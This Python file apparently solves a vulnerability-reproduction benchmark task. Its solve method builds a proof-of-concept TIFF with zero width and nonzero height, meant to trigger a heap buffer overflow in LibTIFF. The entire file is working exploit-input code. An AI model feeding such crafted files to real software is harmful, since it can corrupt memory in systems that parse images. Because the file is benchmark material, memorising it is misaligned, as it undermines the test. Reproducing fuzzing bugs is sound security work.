import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        The problem describes a Heap Buffer Overflow caused by zero width or height images.
        This matches OSS-Fuzz issue 42536 in LibTIFF where a TIFF with zero width/height 
        causes an overflow during processing (e.g., in TIFFReadRGBATile or similar paths).
        
        We construct a valid TIFF file with ImageWidth=0 and ImageLength=16.
        Setting width to 0 often bypasses buffer allocation sizing (size=0) while non-zero 
        height ensures processing loops are entered, leading to a write into the small buffer.
        """
        
        # TIFF Header: Little Endian ('II'), Version 42, IFD Offset 8
        header = b'\x49\x49\x2a\x00\x08\x00\x00\x00'

        # We will define 9 tags.
        # IFD structure: Count(2) + 9 * Entry(12) + NextIFD(4) = 2 + 108 + 4 = 114 bytes.
        # IFD starts at offset 8.
        # Data area starts at offset 8 + 114 = 122.
        
        data_start = 122
        
        # Prepare auxiliary data
        # BitsPerSample: 8, 8, 8 (RGB). Type SHORT (2 bytes). 3 values -> 6 bytes.
        bps_data = struct.pack('<HHH', 8, 8, 8)
        bps_offset = data_start
        
        # Image Data (Strip). 
        # Even though width is 0, we provide data to satisfy read operations if checked before dimension logic.
        # We provide enough bytes for a small strip.
        strip_data = b'\xCC' * 256
        strip_offset = bps_offset + len(bps_data)
        
        # Define Tags
        # Structure: (Tag, Type, Count, Value/Offset)
        # Type 3=SHORT, 4=LONG
        tags = [
            (256, 4, 1, 0),                 # ImageWidth = 0 (VULNERABILITY TRIGGER)
            (257, 4, 1, 16),                # ImageLength = 16 (Ensure loops run)
            (258, 3, 3, bps_offset),        # BitsPerSample = 8,8,8
            (259, 3, 1, 1),                 # Compression = 1 (None)
            (262, 3, 1, 2),                 # PhotometricInterpretation = 2 (RGB)
            (273, 4, 1, strip_offset),      # StripOffsets
            (277, 3, 1, 3),                 # SamplesPerPixel = 3
            (278, 4, 1, 16),                # RowsPerStrip
            (279, 4, 1, len(strip_data))    # StripByteCounts
        ]
        
        # TIFF tags must be sorted by tag number
        tags.sort(key=lambda x: x[0])
        
        # Build IFD
        ifd = bytearray()
        ifd.extend(struct.pack('<H', len(tags))) # Number of entries
        for tag, typ, cnt, val in tags:
            ifd.extend(struct.pack('<HHII', tag, typ, cnt, val))
        ifd.extend(struct.pack('<I', 0)) # Offset to next IFD (0 = none)
        
        # Assemble complete file
        poc = header + ifd + bps_data + strip_data
        
        return poc